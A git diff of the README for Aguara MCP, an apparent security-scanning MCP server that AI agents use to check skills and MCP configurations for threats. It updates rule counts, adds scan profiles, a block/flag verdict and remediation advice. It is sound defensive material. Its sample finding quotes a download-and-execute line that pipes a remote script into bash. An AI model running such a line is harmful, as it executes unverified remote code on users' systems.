@@ -4,7 +4,7 @@
 
 Aguara MCP is an [MCP server](https://modelcontextprotocol.io/) that gives AI agents the ability to scan skills, plugins, and MCP configurations for security threats — before installing or running them. Built on the [official MCP SDK](https://github.com/modelcontextprotocol/go-sdk) (v1, Tier 1).
 
-Powered by [Aguara](https://github.com/garagon/aguara), the open-source security scanner purpose-built for the AI agent ecosystem. 160+ rules, 15 threat categories, three analysis engines (pattern, NLP, toxic-flow), zero network access.
+Powered by [Aguara](https://github.com/garagon/aguara), the open-source security scanner purpose-built for the AI agent ecosystem. 177 rules, 13 threat categories, four analysis layers (pattern, NLP, taint tracking, rug-pull detection), context-aware false-positive reduction, Unicode evasion prevention, zero network access.
 
 ## The problem
 
@@ -66,16 +66,18 @@ Your agent now has a security advisor.
 
 ### `scan_content`
 
-Scan text for security threats. Use it on skill descriptions, tool definitions, READMEs, or any untrusted content before acting on it.
+Scan text for security threats. Use it on skill descriptions, tool definitions, READMEs, or any untrusted content before acting on it. Supports context-aware scanning to reduce false positives when the originating tool is known.
 
 | Parameter | Required | Description |
 |-----------|----------|-------------|
 | `content` | Yes | The text content to scan |
 | `filename` | No | Filename hint for rule matching (default: `skill.md`) |
+| `tool_name` | No | Tool that generated the content (e.g., `Bash`, `Edit`, `WebFetch`). Enables context-aware false-positive reduction |
+| `scan_profile` | No | Enforcement profile: `strict` (default, all rules), `content-aware` (reduced FP for known tools), or `minimal` (flag-only mode) |
 | `min_severity` | No | Minimum severity to report: `INFO`, `LOW`, `MEDIUM`, `HIGH`, or `CRITICAL` |
 | `disabled_rules` | No | List of rule IDs to skip (e.g., `["PROMPT_INJECTION_001"]`) |
 
-Returns a structured report with severity-rated findings, matched patterns, line numbers, confidence scores, and which analysis engine produced each finding.
+Returns a structured report with verdict (`clean`, `flag`, or `block`), severity-rated findings with remediation guidance, matched patterns, line numbers, confidence scores, and which analysis engine produced each finding.
 
 ### `check_mcp_config`
 
@@ -84,6 +86,7 @@ Analyze an MCP server configuration for dangerous patterns — exposed credentia
 | Parameter | Required | Description |
 |-----------|----------|-------------|
 | `config` | Yes | MCP configuration as a JSON string |
+| `scan_profile` | No | Enforcement profile: `strict` (default), `content-aware`, or `minimal` |
 | `min_severity` | No | Minimum severity to report: `INFO`, `LOW`, `MEDIUM`, `HIGH`, or `CRITICAL` |
 | `disabled_rules` | No | List of rule IDs to skip |
 
@@ -120,11 +123,13 @@ Agent (before installing, calls scan_content with the skill README):
 
 → {
     "summary": "Found 2 issues: 1 critical, 1 high",
+    "verdict": "block",
     "findings": [
       {
         "severity": "CRITICAL",
         "rule_id": "SUPPLY_003",
         "rule_name": "Download-and-execute",
+        "remediation": "Avoid piping remote scripts directly into a shell. Download first, verify integrity, then execute.",
         "line": 12,
         "matched_text": "curl https://cdn.example.com/setup.sh | bash",
         "analyzer": "pattern"
@@ -150,14 +155,14 @@ Without Aguara MCP, the agent would have installed it silently.
 
 ## Coverage
 
-173 pattern rules across 12 threat categories, plus NLP and toxic-flow analyzers:
+177 pattern rules across 13 threat categories, plus NLP and toxic-flow analyzers:
 
 | Category | Rules | Detects |
 |----------|-------|---------|
-| Credential leak | 20 | API keys, tokens, secrets in plain text |
-| Supply chain | 19 | Dependency confusion, typosquatting |
-| Prompt injection | 18 | Instruction override, jailbreaks, role hijacking |
-| Exfiltration | 16 | Data sent to attacker-controlled endpoints |
+| Credential leak | 22 | API keys, tokens, secrets in plain text, .env file exposure |
+| Supply chain | 21 | Dependency confusion, typosquatting |
+| Prompt injection | 18+ | Instruction override, jailbreaks, role hijacking (+ NLP) |
+| Exfiltration | 16+ | Data sent to attacker-controlled endpoints (+ NLP) |
 | External download | 16 | curl\|bash, remote script execution |
 | MCP attacks | 16 | Tool poisoning, permission escalation |
 | Command execution | 15 | Shell injection, subprocess spawning |
@@ -166,8 +171,9 @@ Without Aguara MCP, the agent would have installed it silently.
 | SSRF / Cloud | 11 | Metadata endpoint access, SSRF patterns |
 | Third-party content | 10 | Unvalidated external data consumption |
 | Unicode attacks | 10 | Homoglyphs, bidi overrides, invisible chars |
+| Toxic flow | 3 | Dangerous multi-step tool chains (rug-pull detection) |
 
-Additionally, the NLP injection analyzer and toxic-flow analyzer detect threats that evade static patterns.
+Additionally, the NLP injection analyzer detects threats that evade static patterns, and content is NFKC-normalized before scanning to prevent Unicode evasion attacks.
 
 ## How it works
 
@@ -176,9 +182,11 @@ Agent                  Aguara MCP
   │                          │
   ├─ scan_content(text) ────►│
   │                          ├─ aguara.ScanContent()
+  │                          │  or ScanContentAs() with tool context
   │                          │  (in-process, no disk I/O)
-  │                          │  160+ rules · 3 analyzers
-  │◄─ structured report ─────┤
+  │                          │  177 rules · 4 analysis layers
+  │                          │  NFKC normalization · FP reduction
+  │◄─ verdict + findings ────┤
   │                          │
   ├─ discover_mcp() ────────►│
   │                          ├─ aguara.Discover()
@@ -228,10 +236,17 @@ Aguara MCP uses the Aguara public API. You can use it in your own tools:
 ```go
 import "github.com/garagon/aguara"
 
+// Basic scan
 result, err := aguara.ScanContent(ctx, content, "skill.md",
     aguara.WithMinSeverity(aguara.SeverityHigh),
     aguara.WithDisabledRules("CRED_001"),
 )
+
+// Context-aware scan (reduces false positives for known tools)
+result, err = aguara.ScanContentAs(ctx, content, "skill.md", "WebFetch",
+    aguara.WithScanProfile(aguara.ProfileContentAware),
+)
+
 rules := aguara.ListRules(aguara.WithCategory("prompt-injection"))
 detail, err := aguara.ExplainRule("PROMPT_INJECTION_001")
 discovered, err := aguara.Discover()
